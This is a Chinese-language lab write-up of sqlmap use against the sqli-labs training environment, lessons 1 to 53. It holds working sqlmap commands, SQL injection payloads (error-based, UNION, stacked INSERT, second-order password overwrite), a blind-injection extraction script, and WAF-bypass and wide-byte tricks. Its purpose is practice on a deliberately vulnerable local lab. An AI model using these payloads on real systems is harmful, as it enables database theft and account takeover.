# sqlmap使用\_sqlmap于sql labs下使用


本文主要是写[sqlmap](https://so.csdn.net/so/search?q=sqlmap&spm=1001.2101.3001.7020)在sql labs下的使用学习记录，目的在于模拟黑盒测试，不太在意原理。（当然，原理还是要学习好才这么干的。）

不得不说收获还是蛮大的。首先推荐下sqlmap使用的学习视频。
## 1-9：

    python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --batch

## 10：单独的sleep(5)不起效果，



```
[http://127.0.0.1/sqlilabs/Less-10/id=1%22and%20If(ascii(substr(database(),1,1))=114,1,sleep(5))--](http://127.0.0.1/sqlilabs/Less-10/?id=1"and If(ascii(substr(database(),1,1))=114,1,sleep(5))--)+

```

python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-10/?id=1 --batch --level 3

## 11-17

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-16/ --data="uname=123&passwd=123&submit=Submit" --batch --dbs --level 2 或者3

## 18-22：账号：Dumb，密码：Dumb。sqlmap使用-r读取请求包，在需要探测的地方加\*，可以检测出来漏洞点。

18：User Agent

    python sqlmap.py -r ./target.txt --batch --level 5

![7d4761f58cbb5f9252167a58d52dd011.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F7d4761f58cbb5f9252167a58d52dd011.png)

19：Referer

![e88ff511bb45d8cfec15d41857e702fd.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2Fe88ff511bb45d8cfec15d41857e702fd.png)

20：cookie处

21：cookie（需要将注入语句base64加密，源代码处有base64解密）

    python sqlmap.py -r ./target.txt --batch --level 5 --tamper="base64encode.py"

22：cookie（21注入语句前缀后缀的单引号换成双引号）

    python sqlmap.py -r ./target.txt --batch --level 5 --tamper="base64encode.py"

python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-18/ -p “User-Agent” --batch --dbs --level 5 --thread 10 --technique E （此语句无效）
  ' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '1'='1
 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1


![9de4db221b658f62a0471e362e25121f.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F9de4db221b658f62a0471e362e25121f.png)

## 23

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-23/index.php?id=1

## 24：一个二次注入，且漏洞功能为修改原账户密码。无法用sqlmap自动检测。

注册个账户admin’#，然后登入admin’#，然后修改密码，然后原来admin的密码就会被修改覆盖

因为\*\*修改密码（功能）\*\*处形成的 sql 语句是

    UPDATE users SET passwd="New_Pass" WHERE username ='admin'#'xxxx

## 25：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-25/index.php?id=1 --batch

## 26-26a-27：
提示说空格和注释

在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，所以这里需要使用linux来进行搭建

window下可以使用加号（+，%2b）来代替空格，不过union两边有加号会报错，因此只能选择**布尔盲注**或者**时间盲注**。
``` python
//26-27
import requests
url="http://192.168.2.82/sqlilabs/Less-26/?id=1'%26%26(ascii(substr(database(),{},1))={})||'1'='"
result=""
for i in range(1,10):
   for j in range(33,127):
      payload = url.format(i,j)
      r = requests.get(payload)
      r.encoding=r.apparent_encoding
      if "Dumb" in r.text:
         result += chr(j)
         print (result)
         break
//26a
url="http://192.168.2.82/sqlilabs/Less-26/?id=1')%26%26(ascii(substr(database(),{},1))={})||('1'='"

//27a
url="http://192.168.2.82/sqlilabs/Less-27a/?id=1\"%26%26(ascii(substr(database(),{},1))={})||\"1\"=\""

//28-28a
url="http://192.168.2.82/sqlilabs/Less-28/?id=1')%26%26(ascii(substr(database(),{},1))={})||('1'='"


```

##  29-31:
sqlmap -u "http://192.168.1.7/sql/less-29-31/?id=1"  -batch  -dbs
这题就有点意思了，HTTP参数污染。

服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 waf，由于解析参数机制的不同，我们此处可以利用该原理绕过 WAF 的检测；**数据解析顺序：tomcat从前往后，apache从后往前**

**（双同参数）**

![7d0e90386b030892f67977f0534d600a.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F7d0e90386b030892f67977f0534d600a.png)

![07723967c5720bed9a8ffdf8e2897ea3.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F07723967c5720bed9a8ffdf8e2897ea3.png)

    http://127.0.0.1/sqli-labs-master/Less-29/?id=1&id=0' union select 1,database(),3--+
  http://127.0.0.1/sqli-labs-master/Less-29/?id=1&id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),3--+


30：29的单引号改为双引号

31：29的单引号改为")



## 32-33:

宽字节注入，利用mysql使用GBK编码，将两个字符看成一个汉字的特性，消除转移符号“、”，使单引号逃逸出来。**这是每次黑盒测试都需要检测的一个点。**

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-32/?id=1 --thread 10 --tamper="unmagicquotes.py" --batch

34：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-34/ --data="uname=123&passwd=123&submit=Submit" --thread 10 --tamper="unmagicquotes.py" --batch

35：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-35/?id=1  --batch

36：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-36/?id=1 --thread 10 --tamper="unmagicquotes.py" --batch

37：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-37/ --data="uname=123&passwd=123&submit=Submit" --thread 10 --tamper="unmagicquotes.py" --batch

38-41：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-38/?id=1  --batch

## 42-45：

（43同理，前缀变了）

这种东西，除非白盒测试，能够看到源码，否则想不出这数据库名以及字段数。

login\_user=test&login\_password=**1’;insert+into+users+values(44,‘Less32’,‘Less42’)–+**&mysubmit=Login

login\_user=test&login\_password=**1’+or+sysdate()-now()=0+and+sleep(1)=1–+**&mysubmit=Login（我真是个小天才）我好像懂了sqlmap为什么会连接失败了，超时了。

好吧，sqlmap能够测出来，由于容易超时，因此容易在其中一步的询问中问你要不要继续（默认停止），此时你要手动点继续。因此不能够使用–batch参数。–time-sec=1

    python sqlmap.py -r target.txt --flush-session --fresh-queries --time-sec=1

## 46-53：

    python sqlmap.py -u http://192.168.2.82/sqlilabs/Less-46/?sort=1 --batch

## 总结

1.  找注入点，最万能的方法是在请求包后面加星号（\*），然后用-r读取。
2.  先测试什么都不加（只有—batch。如果很多连接失败的报错，则需要手动点击继续，不能使用—batch参数，同时设置盲注延迟时间–time-sec=1）
3.  第二步骤不行的话，level提升为4.
4.  第三步骤不行的话，使用脚本–tamper="unmagicquotes.py"进行宽字节注入。

以上步骤都不行的话，自行使用脚本进行测试。判断双写等waf拦截。或者双同参数的HTTP参数污染。-

